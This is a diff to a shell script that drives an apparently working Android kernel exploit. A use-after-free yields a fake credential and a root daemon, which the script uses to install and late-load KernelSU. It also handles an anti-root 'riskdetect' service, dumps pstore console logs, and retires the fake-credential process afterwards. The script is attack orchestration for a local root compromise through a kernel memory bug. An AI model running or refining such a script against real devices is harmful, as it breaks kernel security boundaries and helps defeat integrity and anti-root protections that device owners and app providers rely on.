@@ -144,7 +144,7 @@ wait_kernelsu_shell() {
 }
 
 echo "[1/4] plant (UAF -> fake cred -> rootd)"
-rm -f t61269.log "$SOCK"
+rm -f t61269.log "$SOCK" /data/local/tmp/t61269-retire
 : > t61269.log
 tail -n +1 -f t61269.log 2>/dev/null &
 TAILPID=$!
@@ -172,6 +172,10 @@ if [ "$ROOTED" != "1" ]; then
   exit 13
 fi
 echo "PLANT_OK: rootd ready"
+if ./t61269_su -c "test -d /sys/fs/pstore" >/dev/null 2>&1; then
+  echo "PSTORE_TAIL:"
+  ./t61269_su -c "cat /sys/fs/pstore/console-ramoops* 2>/dev/null | tail -n 200" 2>&1
+fi
 
 RISK_STATE=$(getprop init.svc.riskdetect 2>/dev/null | tr -d '\r')
 if [ "$DISABLE_ANTIROOT" = "1" ] && [ "$RISK_STATE" = "running" ]; then
@@ -189,11 +193,11 @@ fi
 # SELinux is still permissive: once late-load brings KSU up, the kernel
 # re-enables Enforcing and a new rootd connect is denied.
 echo "[2/4] install + late-load via $MANAGER"
-CMD="$KSUD install; echo KSUD_INSTALL_RC=\$?; $KSUD late-load --kmi $KMI --allow-shell --package-name $MPKG; echo LATE_LOAD_RC=\$?; $KSUD debug info 2>&1 | head -n 20; logcat -d -s ksud 2>/dev/null | tail -n 25"
+CMD="$KSUD install; echo KSUD_INSTALL_RC=\$?; $KSUD late-load --kmi $KMI --allow-shell --package-name $MPKG; echo LATE_LOAD_RC=\$?; $KSUD debug info 2>&1 | head -n 20; logcat -d -s ksud 2>/dev/null | tail -n 25 ; if grep -qi '^kernelsu ' /proc/modules 2>/dev/null || /system/bin/su -c id 2>/dev/null | grep -q uid=0; then touch /data/local/tmp/t61269-retire; fi"
 ./t61269_su -c "$CMD" 2>&1
 if ! wait_kernelsu_shell; then
   echo "LATE_LOAD_RETRY: without --kmi"
-  CMD="$KSUD install; echo KSUD_INSTALL_RC=\$?; $KSUD late-load --allow-shell --package-name $MPKG; echo LATE_LOAD_RC=\$?; $KSUD debug info 2>&1 | head -n 20; logcat -d -s ksud 2>/dev/null | tail -n 25"
+  CMD="$KSUD install; echo KSUD_INSTALL_RC=\$?; $KSUD late-load --allow-shell --package-name $MPKG; echo LATE_LOAD_RC=\$?; $KSUD debug info 2>&1 | head -n 20; logcat -d -s ksud 2>/dev/null | tail -n 25 ; if grep -qi '^kernelsu ' /proc/modules 2>/dev/null || /system/bin/su -c id 2>/dev/null | grep -q uid=0; then touch /data/local/tmp/t61269-retire; fi"
   ./t61269_su -c "$CMD" 2>&1
 fi
 if ! wait_kernelsu_shell; then
@@ -235,13 +239,13 @@ if [ "$SUOK" = "1" ]; then
       fi
     fi
   done
-  # The fake cred page is no longer needed once su works; clean the rootd so a
-  # zygote-only restart does not leave a stale t61269 that blocks the next run.
-  su -c "pkill -9 t61269 2>/dev/null; rm -f $SOCK" 2>/dev/null
-  if pidof t61269 >/dev/null 2>&1; then
-    echo "ROOTD_KEPT: cleanup failed; full reboot before rerun"
+  # Retire the rootd like YuKongA's design: the fake-cred child exits normally
+  # and the parent parks holding the sprayed page.  Do not kill the parent and
+  # do not leave a long-lived fake-cred task around.
+  if ./t61269_su -c true >/dev/null 2>&1; then
+    echo "ROOTD_STILL_UP: fake child did not auto-retire; cold reboot before rerun"
   else
-    echo "ROOTD_CLEANED"
+    echo "ROOTD_RETIRED: fake child exited; parent parked; cold reboot before rerun"
   fi
 else
   echo "ROOTD_KEPT: no su; full reboot before rerun"
